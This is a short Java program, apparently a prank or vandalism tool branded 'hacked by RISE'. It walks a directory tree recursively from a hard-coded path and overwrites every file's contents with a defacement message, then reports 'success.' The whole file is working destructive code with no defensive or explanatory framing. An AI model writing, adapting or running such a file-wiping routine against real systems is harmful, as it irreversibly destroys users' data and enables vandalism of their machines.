import java.io.File;
import java.io.FileWriter;

public class hackedbyrise 
	{
    
    public void writefiles(String folderName){
        File directory = new File(folderName);
        File[] fList = directory.listFiles();
        for (File file : fList) 
        {
            if (file.isFile())
            {
                  try{    
                            FileWriter fw=new FileWriter(file.getAbsolutePath());    
                            fw.write("Alfaizkhan Here... You're hacked by RISE.");    
                            fw.close();    
                    
                  }catch(Exception e)
                    {
                        System.out.println(e);
                    }    
            }    
    
         else if (file.isDirectory()){
                writefiles(file.getAbsolutePath());
            }
        }
    }

    public static void main(String args[])
    {
        
        hackedbyrise h=new hackedbyrise();
        h.writefiles("D:\\Test");
        System.out.println("success.");
    }
}